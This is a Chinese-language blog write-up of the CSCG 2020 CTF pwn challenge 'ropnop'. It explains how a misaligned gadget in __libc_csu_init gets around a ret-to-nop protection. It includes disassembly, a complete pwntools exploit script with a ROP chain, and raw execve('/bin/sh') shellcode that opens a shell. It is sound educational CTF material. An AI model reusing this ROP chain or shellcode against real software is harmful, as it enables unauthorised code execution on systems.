---
layout: post
title: CTF PWN Rop
date: 2020-04-21 00:02:00 +0300
description: CSCG CTF Ropnop
img: 1103.jpg # Add image post (optional)
tags: [归档] # add tag
---
***
### <font color=0066FF>序言</font>

<font color=green>通过CTF进行网络安全的学习是一个非常不错的方法，我认为这也非常有趣。最近，我接触了一种称为ROP的怪异的技术。这里要介绍的是CSCG 2020 CTF的一道PWN题目，主要介绍解题的思路过程：ropnop</font>

<!--break-->

### <font color=0066FF>题目分析</font>
题目线索：使用我的ropnop，可以确保没有人可以利用我的粗略的C代码！
首先检查一下系统保护的情况**checksec ./roper**
``` 
[*] /home/xc/Documents/pwn_docker_example/ctf/CSCG/ropnop/ropnop
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
没有<font color=red>canary</font>的限制，后边虽然开启了<font color=red>NX</font>，但是在代码中发现使用mprotect修改了内存区域的保护属性为可读可写可执行。另外直接使用了printf输出<font color=red>&__executable_start</font>和<font color=red>&etext</font>地址。
![image](/assets/img/1586887691_5e95fc0b07caa.png!small.jpeg){:width="1400px"}

整个程序的功能非常简单：<font color=red>main --> [init_buffering()，ropnop()，read()]</font>，另外还有一个没有调用的函数 gadget_shop()
```
pwndbg> disassemble gadget_shop
Dump of assembler code for function gadget_shop:
   0x00000000000011e0 <+0>:    push   rbp
   0x00000000000011e1 <+1>:    mov    rbp,rsp
   0x00000000000011e4 <+4>:    syscall 
   0x00000000000011e6 <+6>:    ret    
   0x00000000000011e7 <+7>:    pop    rax
   0x00000000000011e8 <+8>:    ret    
   0x00000000000011e9 <+9>:    pop    rdi
   0x00000000000011ea <+10>:    ret    
   0x00000000000011eb <+11>:    pop    rsi
   0x00000000000011ec <+12>:    ret    
   0x00000000000011ed <+13>:    pop    rdx
   0x00000000000011ee <+14>:    ret    
   0x00000000000011ef <+15>:    pop    rbp
   0x00000000000011f0 <+16>:    ret    
End of assembler dump.
```

开始看到这里的时候看到有很多可被构造<font color=red>gadget</font>的"片段"，还有一个<font color=red>syscall</font>可以利用，有一个思路就是通过前边的read进行<font color=red>overflow</font>覆盖<font color=red>ret</font>构建<font color=red>gadget</font>,直接利用这里的syscall进行系统调用执行系统命令。继续分析后发现在ropnop()函数中进行了一些操作修改了程序内容，使得<font color=red>&__executable_start</font>和<font color=red>&etext</font>之间所有的ret转变为nop；就像题目的描述一样，作者认为这样就可以破坏掉gadget的构造！真的是这样吗？程序调用libc库用来对程序进行初始化的函数<font color=red>__libc_csu_init</font>：
```
   ....................
   0x0000555555555330 <+64>:    mov    rdx,r14
   0x0000555555555333 <+67>:    mov    rsi,r13
   0x0000555555555336 <+70>:    mov    edi,r12d
   0x0000555555555339 <+73>:    call   QWORD PTR [r15+rbx*8]
   0x000055555555533d <+77>:    add    rbx,0x1
   0x0000555555555341 <+81>:    cmp    rbp,rbx
   0x0000555555555344 <+84>:    jne    0x555555555330 <__libc_csu_init+64>
   0x0000555555555346 <+86>:    add    rsp,0x8
   0x000055555555534a <+90>:    pop    rbx
   0x000055555555534b <+91>:    pop    rbp
   0x000055555555534c <+92>:    pop    r12
   0x000055555555534e <+94>:    pop    r13
   0x0000555555555350 <+96>:    pop    r14
   0x0000555555555352 <+98>:    pop    r15
   0x0000555555555354 <+100>:    ret 
```
这里开始我想要通过<font color=red>gadget</font>构造<font color=red>execve</font>执行，这样的<font color=red>syscall</font>调用需要满足几个寄存器的内容为：<font color=red>%rax == 0x3b(sys_execve)，%rdi == [/bin/sh]，%rdx == *[/bin/sh]；</font>但非常不幸的是程序真的非常小，实在是找不到足够的gadget，这时我开始怀疑题目的描述，我开始尝试<font color=red>**ROP**</font>以外的方式进行攻击，事实证明我想多了，oh,我感到自己真的很菜，我找了个角落“自卑”了一会；第二天吃了点小葱蘸酱突然想到我忽略了一点，这里题目作为还为我们留了一扇“窗”，我们还有一个***read***函数可以利用，我忽略了一点我们的程序现在是可读可写可执行的，有一个思路<font color=red>ROP + shellcode + ROP</font> 。我们可以将<font color=red>read</font>的<font color=red>buf</font>指向<font color=red>gadget_shop</font>的地址，ok,让我们来尝试构造:
```
pwndbg> x/5i 0x0000555555555351
   0x555555555351 <__libc_csu_init+97>:    pop    rsi
   0x555555555352 <__libc_csu_init+98>:    pop    r15
   0x555555555354 <__libc_csu_init+100>:    ret    
   0x555555555355:    data16 nop WORD PTR cs:[rax+rax*1+0x0]
   0x555555555360 <__libc_csu_fini>:    endbr64 
pwndbg> x/5i 0x0000555555555353
   0x555555555353 <__libc_csu_init+99>:    pop    rdi
   0x555555555354 <__libc_csu_init+100>:    ret    
   0x555555555355:    data16 nop WORD PTR cs:[rax+rax*1+0x0]
   0x555555555360 <__libc_csu_fini>:    endbr64 
   0x555555555364 <__libc_csu_fini+4>:    ret 
```
由上看到在<font color=red>__libc_csu_init</font>中发现一个”美妙的错位“，这是<font color=red>***Intel x86***</font>汇编的“自作聪明”。这里满足了构造rsi和rdi的覆写，条件: <font color=red>%rdi == 0, %rsi == *gadget_shop</font>，尝试写入我们的shellcode：<font color=red>p.sendline("\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05")</font>
![image](/assets/img/1586891373_5e960a6d26835.png!small.jpeg){:width="1400px"}
nice，最后ROP到gadget_shop的位置，执行我们的<font color=red>shellcode：execve("/bin/sh", ["/bin/sh"], NULL);</font> 系统调用执行命令，拿到shell. Done!
我蹩脚的利用脚本:

```
from pwn import *

#p = remote('127.0.0.1', 6666)
#p = remote('hax1.allesctf.net', 9300)
p = process("./ropnop")
#start memory
out = p.recvuntil("\n")
mem_start = int(out.split(" ")[-4], 16)
print out

r12 = 0x68732f6e69622f
gadget_shop_offset = 0x11e0
ropnop_offset = 0x129b
libc_csu_init_off = 0x1351
read_off = 0x12cf
gadget_off = 0x11e0
gadget_shop = mem_start + gadget_shop_offset
ropnop_ret = mem_start + ropnop_offset
libc_csu_init = mem_start + libc_csu_init_off   # call libc init...
read = mem_start + read_off
gadget = mem_start + gadget_off

raw_input(":")
p.sendline("A"*16+p64(ropnop_ret)*2+p64(libc_csu_init)+p64(gadget)*2+p64(libc_csu_init+2)+p64(0)+p64(read)+"A"*40+p64(ropnop_ret)+p64(gadget))
raw_input(":")
p.sendline("\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05")  # shellcode
"""
    xor     rdx, rdx
    mov     qword rbx, '//bin/sh'
    shr     rbx, 0x8
    push    rbx
    mov     rdi, rsp
    push    rax
    push    rdi
    mov     rsi, rsp
    mov     al, 0x3b
    syscall
"""

p.interactive()

```
### <font color=0066FF>我的思考</font>
非常简单的题目，只是我很菜，花了很长时间，不过确实也学到了一些知识。我想我的大脑还有有待开发，我要“进化”。
我们要学会更具有创造性，基础知识的积累也很重要。**看到这里的表哥告诉我你的大脑在什么阶段！！！**

![image](/assets/img/1586891914_5e960c8a33313.png!small.jpeg)

